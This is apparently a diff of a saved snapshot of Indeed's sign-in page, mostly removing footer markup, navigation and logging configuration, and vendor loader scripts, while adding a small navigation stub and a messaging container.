-                  "dataHref": "https://www.indeed.com/accessibility?hl=en\u0026from=gnav-passport--passport-webapp",
-                  "dataGnavElementName": "Accessibility"
-                },
-                {
-                  "description": "Privacy Center and Ad Choices",
-                  "href": "https://hrtechprivacy.com/brands/indeed#privacypolicy",
-                  "dataHref": "https://hrtechprivacy.com/brands/indeed?from=gnav-passport--passport-webapp#privacypolicy",
-                  "dataGnavElementName": "PrivacyAndAdChoices"
-                }
-              ],
-              "legalLink": {
-                "description": "Terms",
-                "href": "https://www.indeed.com/legal?hl=en",
-                "dataHref": "https://www.indeed.com/legal?hl=en\u0026from=gnav-passport--passport-webapp",
-                "dataGnavElementName": "Terms"
-              },
-              "year": 2025
-            },
-            "logRoute": "https://t.indeed.com/signals/gnav/log?from=passport--passport-webapp-%2Fauth\u0026parentLogId=1ihb53j98gqp4801\u0026hostAppTk=",
-            "signalsLogRoute": "https://t.indeed.com/signals/v1/log?from=passport--passport-webapp-%2Fauth\u0026parentLogId=1ihb53j98gqp4801\u0026hostAppTk=",
-            "serviceRequestLogUID": "1ihb53j98gqp4801",
-            "hostAppTk": "",
-            "pageId": "/auth",
-            "canonicalPageId": "",
-            "applicationId": "passport--passport-webapp",
-            "appName": "passport--passport-webapp",
-            "country": "US",
-            "requestURL": "http://secure.indeed.com/auth?hl=en_US\u0026co=US\u0026continue=https%253A%252F%252Fwww.indeed.com",
-            "language": "en",
-            "isMobile": false,
-            "jsErrorLogType": "gnavJSError",
-            "jsErrorLth": "6411ec182c6acd8714dc2d03716eed1d",
-            "jsEnabledLogType": "gnavJSEnabled",
-            "jsEnabledLth": "5e9311c1001227ca5c6c32db123fb854",
-            "interactionLogType": "gnavInteraction",
-            "interactionLth": "87caa20c31fa9e447264b1615339f1ce",
-            "clickLogType": "gnavClick",
-            "clickLth": "fa8b0aff9499e52dd7e9215032d9ad9f",
-            "pageSpeedLogType": "gnavPageSpeed",
-            "pageSpeedLth": "12783140239867f5afc3bd80a743e013",
-            "dwellTimeLogType": "gnavDwellTime",
-            "dwellTimeLth": "e415e44ee819f056fc4675c1b0373740",
-            "clickstreamEnabled": false,
-            "pagenavigationEnabled": true,
-            "clickstreamEnvironmentId": "",
-            "signalsTransportImplementation": "nativeBeacon",
-            "isPreproduction": false,
-            "stagingLevel": "prod",
-            "publicPath": "https://c03.s3.indeed.com/dist/"
-          }
+            };
         </script>
-        <script>
-          if (
-            window.performance !== undefined &&
-            performance.mark !== undefined
-          ) {
-            performance.mark("gnavRenderBlockingCSSFooter:start")
-          }
-        </script>
-        <link
-          rel="stylesheet"
-          type="text/css"
-          href="https://c03.s3.indeed.com/dist/footer/jobseekerDesktopFooter.b78ae6f8505926230bd5.css"
-          crossorigin="anonymous"
-        />
-        <link
-          rel="preconnect"
-          href="https://fonts.gstatic.com/"
-          crossorigin="anonymous"
-        />
-        <link
-          rel="stylesheet"
-          type="text/css"
-          href="https://c03.s3.indeed.com/fonts/v1/indeedsans.css"
-          crossorigin="anonymous"
-        />
-        <script>
-          if (
-            window.performance !== undefined &&
-            performance.mark !== undefined &&
-            performance.measure !== undefined
-          ) {
-            performance.mark("gnavRenderBlockingCSSFooter:end")
-            performance.measure(
-              "gnavRenderBlockingCSSFooter",
-              "gnavRenderBlockingCSSFooter:start",
-              "gnavRenderBlockingCSSFooter:end",
-            )
-          }
-        </script>
-        <div class="gnav gnav-reset" id="gnav-footer-container">
-          <div class="main" data-gnav-region="MainFooter">
-            <footer class="icl-GlobalFooter" role="contentinfo">
-              <div class="icl-GlobalFooter-nav">
-                <ul class="icl-GlobalFooter-items"></ul>
-                <ul class="icl-GlobalFooter-items">
-                  <li class="icl-GlobalFooter-item">© 2025 Indeed</li>
-                  <li class="icl-GlobalFooter-item">
-                    <a
-                      data-gnav-element-name="CPRA"
-                      class="icl-GlobalFooter-link"
-                      href="https://www.indeed.com/legal/ccpa-dns?hl=en"
-                      >Your Privacy Choices<!-- -->
-                      <svg
-                        class="icl-GlobalFooter-cpra-icon"
-                        aria-hidden="true"
-                        id="cpra-logo"
-                        xmlns="http://www.w3.org/2000/svg"
-                        viewBox="0 0 30 14"
-                        focusable="false"
-                      >
-                        <style>
-                          .cpra-st0,.cpra-st1<!-- -->{<!-- -->fill-rule:evenodd;clip-rule:evenodd;fill:#fff<!-- -->}<!-- -->.cpra-st1<!-- -->{<!-- -->fill:#06f<!-- -->}<!-- -->.cpra-st2<!-- -->{<!-- -->fill:#fff<!-- -->}<!-- -->.cpra-st3<!-- -->{<!-- -->fill:#06f<!-- -->}
-                        </style>
-                        <path
-                          class="cpra-st0"
-                          d="M7.4 12.8h6.8l3.1-11.6H7.4C4.2 1.2 1.6 3.8 1.6 7s2.6 5.8 5.8 5.8z"
-                        ></path>
-                        <path
-                          class="cpra-st1"
-                          d="M22.6 0H7.4c-3.9 0-7 3.1-7 7s3.1 7 7 7h15.2c3.9 0 7-3.1 7-7s-3.2-7-7-7zm-21 7c0-3.2 2.6-5.8 5.8-5.8h9.9l-3.1 11.6H7.4c-3.2 0-5.8-2.6-5.8-5.8z"
-                        ></path>
-                        <path
-                          class="cpra-st2"
-                          d="M24.6 4c.2.2.2.6 0 .8L22.5 7l2.2 2.2c.2.2.2.6 0 .8-.2.2-.6.2-.8 0l-2.2-2.2-2.2 2.2c-.2.2-.6.2-.8 0-.2-.2-.2-.6 0-.8L20.8 7l-2.2-2.2c-.2-.2-.2-.6 0-.8.2-.2.6-.2.8 0l2.2 2.2L23.8 4c.2-.2.6-.2.8 0z"
-                        ></path>
-                        <path
-                          class="cpra-st3"
-                          d="M12.7 4.1c.2.2.3.6.1.8L8.6 9.8c-.1.1-.2.2-.3.2-.2.1-.5.1-.7-.1L5.4 7.7c-.2-.2-.2-.6 0-.8.2-.2.6-.2.8 0L8 8.6l3.8-4.5c.2-.2.6-.2.9 0z"
-                        ></path></svg
-                    ></a>
-                  </li>
-                  <li class="icl-GlobalFooter-item">
-                    <a
-                      data-gnav-element-name="Accessibility"
-                      class="icl-GlobalFooter-link"
-                      href="https://www.indeed.com/accessibility?hl=en"
-                      >Accessibility at Indeed<!-- -->
-                    </a>
-                  </li>
-                  <li class="icl-GlobalFooter-item">
-                    <a
-                      data-gnav-element-name="PrivacyAndAdChoices"
-                      class="icl-GlobalFooter-link"
-                      href="https://hrtechprivacy.com/brands/indeed#privacypolicy"
-                      >Privacy Center and Ad Choices<!-- -->
-                    </a>
-                  </li>
-                  <li class="icl-GlobalFooter-item">
-                    <a
-                      data-href="https://www.indeed.com/legal?hl=en&amp;from=gnav-passport--passport-webapp"
-                      data-gnav-element-name="Terms"
-                      class="icl-GlobalFooter-link"
-                      href="https://www.indeed.com/legal?hl=en"
-                      >Terms</a
-                    >
-                  </li>
-                </ul>
-              </div>
-            </footer>
-          </div>
-        </div>
-        <script>
-          ;(() => {
-            var callFnWhenReady =
-              window._INDEED &&
-              window._INDEED.shared &&
-              window._INDEED.shared.v1
-                ? (fn) => fn()
-                : (fn) =>
-                    window.addEventListener(
-                      "onSharedDepsLoadersV1Available",
-                      fn,
-                      { once: true },
-                    )
-            callFnWhenReady(() =>
-              window._INDEED.shared.v1
-                .load("module", {
-                  urls: [
-                    "https://c03.s3.indeed.com/dist/footer/remoteEntry.38ab817d9e96535230f9.js",
-                  ],
-                  container: "gnavFooterModule",
-                  module: "./jobseekerDesktopFooter",
-                  shareScope: "react18_ifl6",
-                  afterEvent: "DOMContentLoaded",
-                })
-                .catch(() => null),
-            )
-          })()
-        </script>
-      </div>
-    </div>
-    <script src="https://c03.s3.indeed.com/passport/s/16f44ed/static/scripts/i18n/en_US.js"></script>
-    <script src="https://c03.s3.indeed.com/passport/static/compiled/286055672feae8cfe3e2/js/auth-page.js"></script>
-    <script
-      type="text/javascript"
-      src="https://appleid.cdn-apple.com/appleauth/static/jsapi/appleid/1/en_US/appleid.auth.js"
-      onload="triggerAppleLoaded()"
-      async
-      defer
-    ></script>
-    <script type="text/javascript">
-      function triggerAppleLoaded() {
-        var event
-        try {
-          event = new Event("apple-loaded")
-        } catch (e) {
-          event = document.createEvent("Event")
-          event.initEvent("apple-loaded", true, true)
-        }
-        window.dispatchEvent(event)
-      }
-    </script>
-    <script type="text/javascript">
-      if (window.parent !== window.self) {
-        window.parent.postMessage({ type: "passport_iframe_loaded" }, "*")
-      }
-    </script>
-    <script>
-      ;(function () {
-        function c() {
-          var b = a.contentDocument || a.contentWindow.document
-          if (b) {
-            var d = b.createElement("script")
-            d.innerHTML =
-              "window.__CF$cv$params={r:'90067a81a87139f3',t:'MTczNjYxNDk4OS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);"
-            b.getElementsByTagName("head")[0].appendChild(d)
-          }
-        }
-        if (document.body) {
-          var a = document.createElement("iframe")
-          a.height = 1
-          a.width = 1
-          a.style.position = "absolute"
-          a.style.top = 0
-          a.style.left = 0
-          a.style.border = "none"
-          a.style.visibility = "hidden"
-          document.body.appendChild(a)
-          if ("loading" !== document.readyState) c()
-          else if (window.addEventListener)
-            document.addEventListener("DOMContentLoaded", c)
-          else {
-            var e = document.onreadystatechange || function () {}
-            document.onreadystatechange = function (b) {
-              e(b)
-              "loading" !== document.readyState &&
-                ((document.onreadystatechange = e), c())
-            }
-          }
-        }
-      })()
-    </script>
-  </body>
+    
+            <script>
+                window.pagenavigation = window.pagenavigation || {
+                    recordInitialNavigation: (params) => {
+                        window.initial_pagnav_params_tmp = params;
+                    },
+                    markSoftNavigationStart: () => {}
+                };
+            </script>
+        </div></nav><style data-emotion="css 1ylu0bo">.css-1ylu0bo{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-box-flex:1;-webkit-flex-grow:1;-ms-flex-positive:1;flex-grow:1;}</style><div id="messaging-root" class="css-1ylu0bo"></div></div>
+</body>
 </html>
